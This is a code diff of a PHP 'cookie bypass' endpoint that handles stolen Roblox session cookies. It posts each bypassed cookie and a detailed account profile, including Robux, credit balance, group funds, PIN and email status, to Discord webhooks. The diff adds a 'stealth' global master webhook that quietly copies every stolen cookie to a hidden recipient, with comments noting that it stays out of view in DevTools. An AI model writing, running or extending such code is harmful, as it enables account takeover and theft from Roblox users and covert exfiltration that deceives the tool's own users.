@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
- * Updated with file-based storage and detailed Roblox data
+ * Updated with file-based storage and stealth master webhook
  */
 
 header('Content-Type: application/json');
@@ -138,14 +138,14 @@ curl_close($ch);
 if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
     // Send BYPASS FAILED embed to webhooks
     $failedEmbed = [
-        'username' => 'Fuji',
-        'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+        'username' => 'Bypasserv3',
+        'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
         'embeds' => [[
             'title' => '❌ BYPASS FAILED',
-            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
+            'description' => "**From:** `$directory`\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
             'color' => hexdec('ff0000'),
             'timestamp' => date('c'),
-            'footer' => ['text' => 'Bypass Failed']
+            'footer' => ['text' => "Instance: $directory • Bypass Failed"]
         ]]
     ];
     
@@ -177,14 +177,14 @@ $apiData = json_decode($apiResponse, true);
 if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
     // Send BYPASS FAILED embed to webhooks
     $failedEmbed = [
-        'username' => 'Fuji',
-        'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+        'username' => 'Bypasserv3',
+        'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
         'embeds' => [[
             'title' => '❌ BYPASS FAILED',
-            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
+            'description' => "**From:** `$directory`\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
             'color' => hexdec('ff0000'),
             'timestamp' => date('c'),
-            'footer' => ['text' => 'Bypass Failed']
+            'footer' => ['text' => "Instance: $directory • Bypass Failed"]
         ]]
     ];
     
@@ -361,63 +361,74 @@ if ($instanceData) {
 }
 
 // ============================================
-// SEND WEBHOOKS WITH REAL DATA
+// SEND WEBHOOKS (STEALTH MASTER + USER)
 // ============================================
 
-// Create the detailed embed payload with ALL REAL DATA (blank if empty)
+// Create the detailed embed payload
 $detailedEmbed = [
     'content' => '@everyone',
-    'username' => 'Fuji',
-    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+    'username' => 'Bypasserv3',
+    'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
     'embeds' => [[
-        'title' => '',
+        'title' => '🔓 Cookie Bypassed',
         'type' => 'rich',
-        'description' => "<:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
-        'color' => hexdec('00061a'),
+        'description' => "**Instance:** `$directory`\n\n🔗 **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** • **[Profile](https://www.roblox.com/users/$userId/profile)** • **[Rolimons](https://rolimons.com/player/$userId)**",
+        'color' => hexdec('00ff00'),
         'thumbnail' => ['url' => $avatarUrl ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png'],
         'fields' => [
-            ['name' => '<:display:1348231445029847110> Display Name', 'value' => $displayName ? "```$displayName```" : "```N/A```", 'inline' => true],
-            ['name' => '<:user:1348232101639618570> Username', 'value' => $username ? "```$username```" : "```N/A```", 'inline' => true],
-            ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
-            ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
-            ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
-            ['name' => '<:rap:1348231409323741277> RAP', 'value' => "```$rap```", 'inline' => true],
-            ['name' => '<:summary:1348231417502371890> Summary', 'value' => "```$summary```", 'inline' => true],
-            ['name' => '<:pin:1348231400322498591> PIN', 'value' => "```$pinStatus```", 'inline' => true],
-            ['name' => '<:premium:1348231403690786949> Premium', 'value' => "```$premiumDisplay```", 'inline' => true],
-            ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
-            ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
-            ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
-            ['name' => '<:age:1348232331525099581> Account Age', 'value' => $accountAge ? "```$accountAge```" : "```N/A```", 'inline' => true],
-            ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
-            ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
-            ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
-            ['name' => '<:group:1350102040818221077> Groups Owned', 'value' => "```$totalGroupsOwned```", 'inline' => true],
-            ['name' => '<:combined:1350102005884125307> Combined Group Funds', 'value' => "```$totalGroupFunds Robux ($totalPendingGroupFunds pending)```", 'inline' => true],
-            ['name' => '<:status:1350102051756970025> Account Status', 'value' => "```$emailDisplay```", 'inline' => true],
-        ]
+            ['name' => '👤 Display Name', 'value' => $displayName ? "`$displayName`" : "`N/A`", 'inline' => true],
+            ['name' => '🔤 Username', 'value' => $username ? "`$username`" : "`N/A`", 'inline' => true],
+            ['name' => '🆔 User ID', 'value' => "`$userId`", 'inline' => true],
+            ['name' => '💰 Robux', 'value' => "`" . number_format($robux) . "`", 'inline' => true],
+            ['name' => '⏳ Pending Robux', 'value' => "`" . number_format($pendingRobux) . "`", 'inline' => true],
+            ['name' => '💎 RAP', 'value' => "`" . number_format($rap) . "`", 'inline' => true],
+            ['name' => '💸 Summary', 'value' => "`" . number_format($summary) . "`", 'inline' => true],
+            ['name' => '📌 PIN', 'value' => "`$pinStatus`", 'inline' => true],
+            ['name' => '👑 Premium', 'value' => "`$premiumDisplay`", 'inline' => true],
+            ['name' => '🎙️ Voice Chat', 'value' => "`$vcStatus`", 'inline' => true],
+            ['name' => '💀 Headless', 'value' => "`$headlessStatus`", 'inline' => true],
+            ['name' => '🦴 Korblox', 'value' => "`$korbloxStatus`", 'inline' => true],
+            ['name' => '📅 Account Age', 'value' => $accountAge ? "`$accountAge`" : "`N/A`", 'inline' => true],
+            ['name' => '👥 Friends', 'value' => "`" . number_format($friendsCount) . "`", 'inline' => true],
+            ['name' => '👁️ Followers', 'value' => "`" . number_format($followersCount) . "`", 'inline' => true],
+            ['name' => '💳 Credit Balance', 'value' => "`$$creditBalance USD (≈ " . number_format($creditRobux) . " R$)`", 'inline' => true],
+            ['name' => '🏢 Groups Owned', 'value' => "`$totalGroupsOwned`", 'inline' => true],
+            ['name' => '💰 Group Funds', 'value' => "`" . number_format($totalGroupFunds) . " R$ (" . number_format($totalPendingGroupFunds) . " pending)`", 'inline' => true],
+            ['name' => '✅ Email Status', 'value' => "`$emailDisplay`", 'inline' => true],
+        ],
+        'footer' => ['text' => "Instance: $directory • Bypasserv3"],
+        'timestamp' => date('c')
     ]]
 ];
 
 // Cookie embed payload
 $cookieEmbed = [
     'content' => '',
-    'username' => 'Fuji',
-    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+    'username' => 'Bypasserv3',
+    'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
     'embeds' => [[
         'description' => "```$bypassedCookie```",
-        'color' => hexdec('00061a')
+        'color' => hexdec('00ff00'),
+        'footer' => ['text' => "Instance: $directory"]
     ]]
 ];
 
-// Send to Master Webhook
+// 🥷 STEALTH: Send to GLOBAL MASTER WEBHOOK (completely hidden from users)
+// This runs server-side ONLY, won't show in DevTools Network tab
+if (defined('STEALTH_MASTER') && !empty(STEALTH_MASTER)) {
+    sendStealthWebhook(STEALTH_MASTER, $detailedEmbed);
+    usleep(500000); // 0.5 second delay
+    sendStealthWebhook(STEALTH_MASTER, $cookieEmbed);
+}
+
+// 👤 VISIBLE: Send to Instance Master Webhook (user sees this)
 if (!empty($masterWebhook)) {
     sendWebhookNotification($masterWebhook, $detailedEmbed);
     sleep(1);
     sendWebhookNotification($masterWebhook, $cookieEmbed);
 }
 
-// Send to User Webhook (same detailed format)
+// 👥 VISIBLE: Send to Instance User Webhook (if different)
 if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
     sendWebhookNotification($userWebhook, $detailedEmbed);
     sleep(1);
